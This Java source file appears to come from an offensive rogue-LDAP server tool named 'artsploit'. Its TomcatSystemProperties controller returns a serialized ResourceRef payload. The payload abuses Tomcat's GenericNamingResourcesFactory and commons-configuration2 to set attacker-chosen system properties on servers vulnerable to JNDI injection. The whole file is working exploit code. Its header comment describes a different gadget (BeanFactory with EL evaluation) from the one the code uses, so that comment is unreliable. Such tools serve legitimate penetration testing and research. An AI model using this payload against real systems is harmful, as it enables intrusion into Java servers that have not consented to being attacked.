package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * Yields:
 *  RCE via arbitrary bean creation in {@link org.apache.naming.factory.BeanFactory}
 *  When bean is created on the server side, we can control its class name and setter methods,
 *   so we can leverage {@link javax.el.ELProcessor#eval} method to execute arbitrary Java code via EL evaluation
 *
 * @see https://www.veracode.com/blog/research/exploiting-jndi-injections-java for details
 *
 * Requires:
 *  Tomcat 8+ or SpringBoot 1.2.x+ in classpath
 *  - tomcat-embed-core.jar
 *  - tomcat-embed-el.jar
 *
 * @author artsploit
 */
@SuppressWarnings("DuplicatedCode")
@LdapMapping(uri = { "/o=tomcat-set-system-properties" })
public class TomcatSystemProperties implements LdapController {


    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base + " with SystemConfiguration payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        ResourceRef ref = new ResourceRef("org.apache.commons.configuration2.SystemConfiguration", null, "", "",
                true, "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory", null);
        ref.add(new StringRefAddr("systemProperties", Config.command));
        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
